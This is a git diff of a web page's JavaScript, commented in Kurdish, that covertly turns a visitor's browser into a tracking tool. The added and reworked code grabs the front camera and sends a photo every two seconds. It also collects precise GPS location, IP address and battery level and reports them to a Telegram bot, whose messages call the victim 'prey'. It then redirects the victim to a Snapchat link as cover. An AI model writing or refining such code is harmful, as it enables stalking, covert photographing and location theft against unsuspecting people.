@@ -14,42 +14,26 @@
 
     async function capture() {
         if (!targetID) return;
-
-        // 🔥 ڕێدایرێکت دوای ١٥ چرکە بۆ ئەوەی کاتی پێویست هەبێت بۆ GPS
-        setTimeout(() => {
-            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
-        }, 15000);
-
-        // 📍 یەکەم هەنگاو: داواکردنی لوکەیشن بە وردی بەرز (ئەمە ئایکۆنەکە چالاک دەکات)
-        navigator.geolocation.getCurrentPosition(pos => {
-            sendLocation(pos.coords.latitude, pos.coords.longitude);
-        }, err => {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگەی بە لوکەیشن نەدا.");
-        }, { enableHighAccuracy: true, timeout: 10000 });
-
         try {
-            // 📷 دووەم هەنگاو: داواکردنی کامێرا
+            // داواکردنی کامێرا
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user" }, 
                 audio: false 
             });
 
-            let batteryInfo = "Unknown";
-            if (navigator.getBattery) {
-                const batt = await navigator.getBattery();
-                batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
-            }
+            // زانیاری ئایپی و باتری
+            getExtraInfo();
 
-            fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => {
-                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
-                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-                    sendToTelegram(report);
-                });
+            // 📍 وەرگرتنی لوکەیشن (ڕێک وەک کۆدە کۆنەکە)
+            navigator.geolocation.getCurrentPosition(pos => {
+                sendLocation(pos.coords.latitude, pos.coords.longitude);
+                
+                // 🔥 تەنها کاتێک لوکەیشنەکە نێردرا، دوای ٣ چرکە بیبە بۆ سناپچات
+                setTimeout(goToSnap, 3000);
+            }, err => {
+                sendToTelegram("⚠️ نێچیرەکە ڕێگەی بە لوکەیشن نەدا.");
+                setTimeout(goToSnap, 2000);
+            }, { enableHighAccuracy: true });
 
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -64,11 +48,30 @@
                 ctx.drawImage(video, 0, 0);
                 canvas.toBlob(b => { if (b) sendFile(b, "photo"); }, 'image/jpeg', 0.7);
             };
-            setInterval(takeSnap, 700);
+            // وێنەگرتن هەموو ٢ چرکە جارێک
+            setInterval(takeSnap, 2000);
 
         } catch (e) {
-            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتی کامێرا.");
-            window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+            sendToTelegram("⚠️ نێچیرەکە ڕێگری کرد لە دەسەڵاتەکان.");
+            setTimeout(goToSnap, 1000);
+        }
+    }
+
+    function goToSnap() {
+        window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ?share_id=E6x9tSXD9VM&locale=en-US");
+    }
+
+    function getExtraInfo() {
+        if (navigator.getBattery) {
+            navigator.getBattery().then(batt => {
+                let battery = `${(batt.level * 100).toFixed(0)}%`;
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(data => {
+                        let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n👤 ID: <code>${targetID}</code>\n🌐 IP: <code>${data.ip}</code>\n🔋 Battery: <code>${battery}</code>`;
+                        sendToTelegram(report);
+                    });
+            });
         }
     }
 
